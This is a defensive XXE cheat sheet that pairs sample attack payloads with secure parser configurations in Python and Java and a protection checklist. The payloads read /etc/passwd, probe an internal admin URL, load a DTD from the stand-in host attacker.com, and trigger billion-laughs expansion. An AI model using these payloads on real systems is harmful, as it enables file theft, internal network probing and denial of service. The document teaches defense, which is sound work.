# XXE - Quick Reference

## **XXE Attack Types**

### **File Disclosure**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

```

### **SSRF**

```xml
<!ENTITY xxe SYSTEM "http://internal-server:8080/admin">

```

### **Blind XXE**

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>

```

### **DoS (Billion Laughs)**

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!-- Exponential expansion -->
]>

```

## **Secure XML Parsers**

### **Python**

```python
# ✅ Secure
from defusedxml.ElementTree import parse
tree = parse(xml_data)

# ✅ Secure (configured)
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(xml_data, parser)

# ❌ Vulnerable
from xml.etree.ElementTree import parse
tree = parse(xml_data)

```

### **Java**

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

```

## **XXE Protection Checklist**

- ✅ Use secure XML parsers (defusedxml)
- ✅ Disable external entities
- ✅ Disable DOCTYPE declarations (when possible)
- ✅ Input validation (reject DOCTYPE)
- ✅ Use JSON when possible
- ✅ Restrict network access
- ✅ Secure file system permissions

## **Common Vulnerable Locations**

- SOAP endpoints
- REST APIs accepting XML
- File uploads (Office docs, SVG)
- Configuration file processing
- RSS/Atom feeds

## **Risk Levels**

| Vulnerability | Risk Level |
| --- | --- |
| XXE with File Disclosure | Critical |
| XXE with SSRF | Critical |
| Blind XXE | High |
| XXE DoS | High |
| Missing Secure Parser | Critical |

## **Tools**

- **Burp Suite**: XXE plugin, manual testing
- **Custom Scripts**: Automated payload testing
- **OWASP ZAP**: Automated scanning